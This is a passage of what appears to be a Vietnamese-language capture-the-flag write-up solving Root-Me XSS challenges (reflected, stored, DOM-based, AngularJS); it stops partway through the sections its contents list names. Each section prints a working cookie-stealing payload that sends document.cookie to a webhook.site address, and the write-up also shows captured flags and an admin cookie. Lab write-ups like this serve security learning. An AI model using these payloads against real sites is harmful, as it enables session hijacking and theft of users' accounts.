```
Rootme:
XSS Reflected
XSS-Stored1
XSS-DOM Based introduction
XSS DOM based-AngularJS
XSS DOM Based-Eval
XSS-Stored2
Webhacking.kr:
Baby
Pro
```

# Rootme:
## XSS Reflected:
**Description**:`Find a way to steal the administrator’s cookie.` </br>
`Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.`

![image](https://user-images.githubusercontent.com/92881216/223759750-e2d8ceda-23c2-45b4-8594-67202cd35d59.png)

Dạo 1 vòng web em dễ dang tìm được input để inject : `http://challenge01.root-me.org/web-client/ch26/?p=home`. Đó là biến p được gán trên URL. Sau đó em thử nhập 1 số giá trị khác. Khi em nhập `abc` và check source code:

![image](https://user-images.githubusercontent.com/92881216/223760976-75c80c1e-ccf9-4439-9dd3-261963a80d13.png)

![image](https://user-images.githubusercontent.com/92881216/223761390-41b496cb-0603-4967-8240-04568ce9780e.png)

Như vậy đây có thể là chỗ xảy ra XSS và có chức năng report to admin. Mục tiêu bây giờ là phải tìm cách chèn và thực thi được script.

Để ý với giá trị `abc` được nhập thì html được trả về là `<a href="?p=abc">abc</a>`. Nhập tiếp với payload đơn giản `<h1>abc</h1>`, em check source thì được `<p>The page <a href='?p=&lt;h1&gt;abc&lt;/h1&gt;'>&lt;h1&gt;abc&lt;/h1&gt;</a> could not be found.</p>` như vậy ký tự `<`,`>` đã được mã hóa html. Tiếp tục em test với các ký tự khác và biết được `"` cũng bị mã hóa html còn các ký tự như `(`,`)`,`'`,`;` thì không.<br> 
Các payload nhập vào được đưa vào giá trị của attribute `href` nên đây có thể khai thác bằng cách bằng cách escape attribute đó để chèn script độc hại phía sau. Đọc lại mô tả của bài này : `Be careful, this administrator is aware of info security and he does not click on strange links that he could receive.`, em liên tưởng đến việc dùng các event để thực thi script. Và do `'`, `(`, `)` không bị mã hóa nên em thử luôn với payload : `' onmouseover=alert(1) '`, sau đó di chuột vào thì hàm `alert(1)` được thực thi:

![image](https://user-images.githubusercontent.com/92881216/223768238-06c9bb84-d001-4c76-8da1-c740cd746b83.png)

Em tiếp tục viết script để steal cookie và dùng `webhook.site` để xem request:
```
' onmouseover='document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c="+document.cookie' '
```
Nhưng nhận ra bị filter mất dấu cộng nên phải dùng `concat()` và nối chuỗi:
```
' onmouseover='document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie)' '
```
Gửi report cho admin và chờ kết quả:
![image](https://user-images.githubusercontent.com/92881216/223775467-adec68c4-1cfd-42ae-823d-caf0db49f3ff.png)

> `flag=r3fL3ct3D_XsS_fTw`

## XSS-Stored1
**Description:** `Steal the administrator session cookie and use it to validate this chall.`
![image](https://user-images.githubusercontent.com/92881216/223778497-ca220bf7-d02a-496b-9bda-7ac543c3d7a0.png)

Nhìn qua web này có chức năng lưu trữ tin nhắn mình nhập lên:

![image](https://user-images.githubusercontent.com/92881216/223778828-45ae7220-aae7-42af-a33f-587556be73fa.png)

Nhập sơ qua 1 số payload `<h1>abc</h1>` và nhận thấy phần `messenger` bị xss :
![image](https://user-images.githubusercontent.com/92881216/223779206-19d67996-cab2-4323-8a40-cbc6222cd379.png)
Nhập tiếp với payload: `<script>alert(1)</script>`:
![image](https://user-images.githubusercontent.com/92881216/223779378-29d464e1-a754-4386-8771-0c2f616c6a7a.png)
Như vậy web đã thực thi `alert(1)` mà không qua filter gì. Sau đó em nhập thẳng payload:
```
<script>document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie)</script>
```
Chờ 1 lúc nhận được:
![image](https://user-images.githubusercontent.com/92881216/223781330-9dfddad1-95df-47a2-aaf3-62ce92fa4264.png)

> `ADMIN_COOKIE=NkI9qe4cdLIO2P7MIsWS8ofD6`

## XSS-DOM Based introduction
**Description:** `Steal the admin’s session cookie.`

![image](https://user-images.githubusercontent.com/92881216/223781835-2bcdb489-ceec-4146-abaf-c2dc39109106.png)

Bài toán ở đây là nhập vào 1 số và đây là chỗ có thể xss. Em thử nhập vào số bất kỳ và xem source:

![image](https://user-images.githubusercontent.com/92881216/223786727-287b16cd-7464-41b9-85b8-8458bb364892.png)

Khi em nhập vào 1 và kết quả `var number = '1';`. `1` được truyền vào biến number và kẹp giữa 2 dấu nháy đơn `'`. <br>
Em nghĩ ngay đến việc dùng nháy đơn để escape ra rồi dùng `;` kết thúc câu lệnh gán đó đồng thời viết tiếp `alert(1);` để test và dùng `//` để comment phần thừa phía sau. Payload: `'; alert(1); //` và đúng như dự đoán web đã thực thi `alert(1)`:

![image](https://user-images.githubusercontent.com/92881216/223787855-0543d1f1-cef1-4b9f-bb34-c219fee1a5bf.png)

Em tiếp tục dùng script để lấy cookie bằng payload: 
```
';document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie);//
```

Và gửi URL trong phần contact: `http://challenge01.root-me.org/web-client/ch32/index.php?number=';document.location="https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=".concat(document.cookie);//`

Kết quả: 
![image](https://user-images.githubusercontent.com/92881216/223789126-7828c265-c8fc-4651-a3e6-85d73a600f89.png)

> `flag=rootme{XSS_D0M_BaSed_InTr0}`




## XSS DOM based-AngularJS:

```
{{constructor.constructor("document.location=`https://webhook.site/509048d1-6397-4a3f-ac0f-9133e64a24dd?c=`.concat(document.cookie)")()}}
```
![image](https://user-images.githubusercontent.com/92881216/223808226-8e80ab23-1efd-4dfd-87a7-316a5b96e564.png)

> `flag=rootme{@NGu1@R_J$_1$_C001}`




